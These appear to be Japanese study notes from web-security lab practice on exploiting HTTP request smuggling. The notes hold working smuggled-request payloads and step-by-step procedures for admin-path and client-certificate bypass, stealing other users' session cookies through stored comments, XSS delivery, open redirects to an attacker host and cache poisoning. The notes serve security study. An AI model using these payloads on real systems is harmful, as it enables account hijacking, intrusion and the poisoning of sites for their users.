## フロントエンドのセキュリティのバイパス

- `/home`へのアクセスは許可されているが、`/admin`へのアクセスは禁止されている場合

1. `/admin`へアクセスするも、"Path /admin is blocked"エラーが表示されることを確認
2. 通常のペイロードでSmuggleするも、"Admin interface only available to local users"エラーが表示される
3. `Host: localhost`を追加しsmuggle attack
```http
prefix = '''GET /admin HTTP/1.1

Content-Type: application/x-www-form-urlencoded
```

## フロントエンドのリクエスト書き換えを明らかにする

###### 基本概念

- フロントエンドが通常のリクエストを書き換え、密輸(smuggle)したリクエストには気づかず書き換えない場合、バックエンドサーバが密輸したリクエストを狙い通りに処理してくれないことがある

- フロントエンドサーバが通常のリクエストへ加える変更の例
	- `X-Forwarded-For`ヘッダの追加
	- TLS接続を終了し、使用されたプロトコルと暗号を記述するヘッダの追加
	- 他の攻撃に利用可能な機密情報の追加

#### フロントエンドによる書き換えを明らかにするステップ

- ⚠️このステップのみ「維持系」。書き換えを明らかにしたらSmuggelrで悪用

1. リクエストパラメタの値が直にレスポンスに反映されるPOSTリクエストを見つける(`email`パラメタとする)
2. レスポンスに反映されるパラメタがメッセージbodyの最後に表示されるようにパラメタの順番を入れ替える
	- `email=foo&username=hoge` -> `username=hoge&email=foo`

3. このリクエストを密輸する
	- 密輸の方法は脆弱性の種類ごとに異なる
	- [2. 基本的なHRSの実行](2.%20基本的なHRSの実行.md)の`SMUGGLED`の場所にリクエストを記述する
	- 密輸するリクエストのヘッダは`Content-Type`, `CL`, `Cookie`のみ(必要時は`Host`も)残せば良い
 
==⚠️==: 密輸したリクエストの`Content-Length`は短すぎると書き換えられたリクエストのすべてを表示できないし、長すぎてもリクエストがタイムアウトする。内容を見ながら入手したい情報に合わせて都度値を変えていくこと

###### 具体例

1. emailパラメタの値をレスポンスに反映するPOSTリクエストがあるとする
```http
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net&username=wiener
```
- ちゃんとレスポンスに反映している
```html
<input id="email" value="wiener@normal-user.net" type="text">
```

2. レスポンスに反映されたパラメタ(`email`)がメッセージbodyの最後に表示されるように順番を入れ替える
```http
...
username=wiener&email=wiener@normal-user.net
```

3. このリクエストを密輸する
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130 
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com //必要ないかも
Content-Type: application/x-www-form-urlencoded
Content-Length: 100 //*1：このContent-Length

email=wiener@normal-user.net
```
- レスポンスに「フロントエンドによって書き換えられた値」が追加表示される
```html
<input id="email" value="wiener@normal-user.netPOST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
```

### 悪用ステップ

1. [4. HRS脆弱性の悪用](4.%20HRS脆弱性の悪用.md#フロントエンドによる書き換えを明らかにするステップ)を実行し、書き換えられる内容をメモする
2. prefix部にステップ1でメモした「書き換えられる内容」を付与してリクエストする。([4. HRS脆弱性の悪用](4.%20HRS脆弱性の悪用.md#エラー対処法(prefix記述部))を参考に)
```http
prefix = '''GET /admin HTTP/1.1
[書き換えられる内容]: xxx
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x='''
```

#### クライアント認証のバイパス(実践なし)

###### 基本概念

- TLS接続におけるクライアント側の認証のこと。CN(common name)の提示
- フロントエンドサーバはバックエンドサーバへリクエストを転送するときに証明書から関連する詳細情報を、1つ以上の非標準HTTPヘッダを介してバックエンドサーバに渡すためリクエストの書き換えを行うことがある。
```http
GET /admin HTTP/1.1
Host: normal-website.com
X-SSL-CLIENT-CN: carlos
```

- フロントエンドサーバによって書き換えられる情報は非公開(だと思われている)ので、バックエンドサーバは書き換えられた内容を「暗黙的に信頼」する場合がある
- ヘッダーと正しい値の組み合わせでクライアント認証をバイパスできるかもしれない

- 攻撃者はフロントエンドサーバによって書き換えられる内容を割り出し、メモし、密輸するリクエストの中に埋め込むことでクライアント認証をバイパスできる
	- 密輸してなければフロントエンドによって上書きされてしまうが。

```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Foo: x
```

## 他のユーザのリクエストをキャプチャする

- ⚠️「維持系」
##### 基本概念

- 考え方は[4. HRS脆弱性の悪用](4.%20HRS脆弱性の悪用.md#フロントエンドのリクエスト書き換えを明らかにする)に近い
- Webアプリが入力されたテキストデータを保存し、後で取り出す機能を持つ場合で可能な悪用
- 攻撃を実行するには、他のユーザのリクエストデータを格納するためのパラメータをリクエストの最後に置き、データを格納関数に送信するリクエストを密輸する必要がある。

###### リクエストキャプチャに使用する機能：

- Comment　(任意のデータを長文で保存しやすいので第一優先)
- email　(特定の形式のデータでないとエラーが起きるかも)
- プロフィール説明
- スクリーンネーム(一意性のあるユーザ名)
- Recent searches

###### 具体例

- アプリがブログ記事のコメントを投稿するために以下のリクエストを使い、それが保存され、ブログに表示されるとする
```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=token&postId=2&comment=My comment&name=Carlos Montoya&email=carlos@normal-user.net&website=https://normal-user.net
```

- 次に、「長すぎる」`CL`ヘッダと、リクエストの最後に配置されたcommentパラメータを持つリクエストを、以下のように密輸したらどうなるか：
```http
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330 

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400 //長すぎる値
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=token&postId=2&name=Carlos Montoya&email=carlos@normal-user.net&website=https://normal-user.net&comment=
```

- 密輸されたリクエストの`CL`ヘッダは、ボディの長さが400バイトになることを示しているが、我々は144バイトしか送っていない。
- この場合、バックエンドサーバは==レスポンスを発行する前に残りの 256 バイトを待つ==。その結果、別のリクエストが「同じコネクションを経由」してバックエンドサーバに送られると、最初の256バイトは以下のように密輸されたリクエストに追加される：
```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=token&postId=2&name=Carlos Montoya&email=carlos@normal-user.net&website=https://normal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj //他のユーザのCookie
... 
```

- 被害者のリクエスト内容が、攻撃者の長すぎる`CL`を指定したリクエストに付与され、コメントとして投稿される。攻撃者はコメントを読み、機密情報を窃取する

##### リクエストキャプチャ上の注意

- 密輸リクエストで指定する`CL`の長すぎる値は、短すぎると情報が入手できず、長すぎるとタイムアウトする。試行錯誤が必要
- このテクニックの制限として、密輸したリクエストに付与される被害者のリクエストは、区切り文字(`&`等)に到達するまでのデータしか窃取できない

### リクエストキャプチャのステップ

⚠️密輸リクエストのsession cookieとcsrf tokenは正しいものを使用すること

1. [4. HRS脆弱性の悪用](4.%20HRS脆弱性の悪用.md#リクエストキャプチャに使用する機能：)のような、ユーザの入力を受け取り、後でどこかのページ上で出力する機能を見つける(以下、comment投稿を例にとる)
2. [4. HRS脆弱性の悪用](4.%20HRS脆弱性の悪用.md#リクエストキャプチャに使用する機能：)のパラメタをメッセージbodyの最後に表示されるようにパラメタの順番を入れ替える
	- `comment=TEST&name=suzuki` -> `name=suzuki&comment=TEST`

3. このリクエストを密輸箇所に記載する。(密輸リクエストはHTTP/1.1にすること)
	- 密輸の方法は脆弱性の種類ごとに異なる
	- [2. 基本的なHRSの実行](2.%20基本的なHRSの実行.md)の`SMUGGLED`の場所にリクエストを記述する
	- 密輸するリクエストのヘッダは`Content-Type`, `CL`, `Cookie`のみ(必要時は`Host`も)残せば良い

4. 被害者のリクエスト内容が表示されるように密輸リクエストの`CL`の値を調整する。
	-  💡`CL`の値は通常の`GET /`リクエストのバイト数 + 160くらいにする

5. ⭐️もう1つリクエストをRepeaterに用意しそのリクエスト全体のLengthが、もう片方に記載の密輸リクエストの`CL`の値より少しだけ大きくなるように、空白を追加していく(update content-lengthはいじらなくていい。)
```http
POST / HTTP/1.1
Host: TARGET_NET
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

foo=bar
\r\n
.
.
.
```

6. 密輸リクエストを含むリクエストを送信し、ステップ5で用意したリクエストを送信。これをステップ5で用意したリクエストに対するレスポンスが200になるまで繰り返す。200が表示されたらブラウザを再読み込みする。これをvictimの情報が入手できるまで繰り返す
7. 入手したい情報まで表示されない -> `CL`を徐々に増やす。レスポンスが遅くいつまでもvictimの情報が表示されない -> `CL`を徐々に減らす

詳細：[Youtube: 8:35~](https://www.youtube.com/watch?v=lXtZU7AGtus&t=301s)

###### CL.TE脆弱性のときリクエスト具体例

## HRS × 反射型XSS

###### 反射型XSS単体と比べて優れている点

- 被害者によるインタラクションが必要ない。被害者に悪意あるURLを渡してアクセスしてもらう必要がない。
	- XSSペイロードを含むリクエストを密輸した後、その直後に同じ接続を使って被害者がリクエストすると、バックエンドはXSSペイロードを処理したレスポンスを被害者に返す

- HTTPリクエストヘッダのように、制御しにくいリクエスト部分をXSSのために使用できる
	- 通常のリクエストヘッダはユーザが制御してもサーバに上書きされることが多い

###### 具体例

- もし`User-Agent`ヘッダがXSSに対して脆弱な場合(CL.TE)
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```
- 次のユーザのリクエストは、密輸されたリクエストに連結され送信される。
- バックエンドサーバは密輸されたリクエストと被害者が送ったリクエストを連結したものを処理し、XSSペイロードへのレスポンスを返す

### HRS × 反射型XSS悪用ステップ

1. 密輸するリクエスト全体をActive Scanにかけて以下を確認する
	- エントリポイント( HRSと組み合わせる場合はリクエストヘッダの内容が多い)
	- 出力箇所
	- XSSのコンテキスト

2. XSSペイロードを埋め込んだsmuggle attackをする
	- 以下、`User-Agent`ヘッダがエントリポイント、出力箇所が`/post?postId=1`とする
```http
prefix = '''GET /post?postID=1 HTTP/1.1
User-Agent: a"><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x='''
```
- ⚠️：密輸するリクエストは出力箇所(`post?postId=1`)へのリクエストにすること

## Misc
#### HRSを使った、on-site redirectからopen redirectへの変更(実践無)

###### on-site redirectの基本

- 多くのWebアプリは「同じドメイン内の別のページ」へon-siteリダイレクトを実行する
- 💡==リダイレクトが起きるかはファイル名を削除し、ディレクトリ名後の`/`を削除することでわかることが多い==
	- `example/js/hoge.js` -> `example/js`

- 以下はApacheとIISによるWebサーバのデフォルトの動作
```http
GET /home HTTP/1.1
Host: normal-website.com
```
```http
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
- `Location`ヘッダに対して以下の変更が加わる
	1. `Host`ヘッダから取り出したホスト名を追加。
	2. リクエスト行に指定したフォルダ名に`/`を追加
	3. 1, 2を合わせてリダイレクトURLを作成

#### 上記の挙動にHRSを使用した被害者へのopen redirect強制

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
- 攻撃者によって密輸されたリクエストが、同じ接続を使用してリクエストを送った被害者のリクエストの開始とみなさる
- 被害者のリクエストとredirectレスポンスは以下のようになる
```http
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1 //注
Host: vulnerable-website.com
```
```http
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
- 被害者は(`scripts/include.js`で)JavaScriptファイルをリクエストしているので、攻撃者は`attacker~/home/`に悪意あるJavaScriptを用意すれば甚大な被害へつながる

#### root-relative redirectからのopen redirect

###### ルート相対リダイレクト・プロトコル相対URLとは？

- ルート相対リダイレクト：ルートディレクトリを起点としてファイルの位置を表す
```http
/example
```

- プロトコル相対URL: 現在のページと同じhttpやhttpsなどのプロトコルを使用し`//`から始まるURLの形式
```http
//example.com/hoge
```

###### 攻撃具体例

- `Location`ヘッダのルート相対URLを構築するためにパスを使用するサーバレベルのリダイレクトがある
```http
GET /example HTTP/1.1
Host: normal-website.com
```
```http
HTTP/1.1 301 Moved Permanently
Location: /example/
```

- サーバがプロトコル相対URLの使用を許可していたら、open redirectに使える
```http
GET //attacker-website.com/example HTTP/1.1
Host: vulnerable-website.com
```
```http
HTTP/1.1 301 Moved Permanently
Location: //attacker-website.com/example/
```

#### HRS × Webキャッシュポイズニング(Expert)

- [4. HRS脆弱性の悪用](4.%20HRS脆弱性の悪用.md#HRSを使った、on-site%20redirectからopen%20redirectへの変更(実践無))のバリエーションの1つ
- ⚠️維持系

###### 関連

- [1. Web cache poisoningの基本と対策](../Web%20cache%20poisoning/1.%20Web%20cache%20poisoningの基本と対策.md)

###### 攻撃概要

- open redirectへのレスポンスでキャッシュを汚染し、同じURLへアクセスする被害者に対して半永続的に悪意あるレスポンスを返すことが可能
- 攻撃者は以下のリクエスト全体をフロントエンドに送り、レスポンスをキャッシュさせておく
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /static/include.js HTTP/1.1
Host: vulnerable-website.com
```

- バックエンドはopen redirectで応答する
```http
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
- フロントエンドは`/static/include.js`へのレスポンスがopen redirectであると信じてキャッシュする

- 以降、被害者が以下のJSにリクエストするとopen redirectされる
```http
GET /static/include.js HTTP/1.1
Host: vulnerable-website.com
```
```http
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

##### HRS × Webキャッシュポイズニングステップ

- Unkeyは密輸したリクエストの`Host`ヘッダ

1. Cache oracleを見つける[2. 実装の欠陥の探索](../Web%20cache%20poisoning/4.%20キャッシュ実装の欠陥の悪用/2.%20実装の欠陥の探索.md#1.%20適切なCache%20oracleの特定)
	- 以下、`resources/js/tracking.js`をCache oracleとする

2. on-siteリダイレクトのエンドポイントを見つける
3. HTTP Request Smugglerで脆弱性の種類を検出
4. リダイレクトエンドポイントのリクエストを密輸し、`Host`ヘッダに任意の値を指定する。([2. 基本的なHRSの実行](2.%20基本的なHRSの実行.md)のSMUGGLEDのところへ)
```http
GET /post/next?postId=3 HTTP/1.1
Host: anything
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
- レスポンスで指定した値が反映されていることがわかる
```http
HTTP/1.1 302 Found
Location: https://anything/post?postId=4
...
```

5. 攻撃者のホストするサーバで、ステップ2で入力値が反映されたファイル(`post`)を作成する。
```http
HTTP/1.1 200 OK
Content-Type: text/javascript; charset=utf-8
```
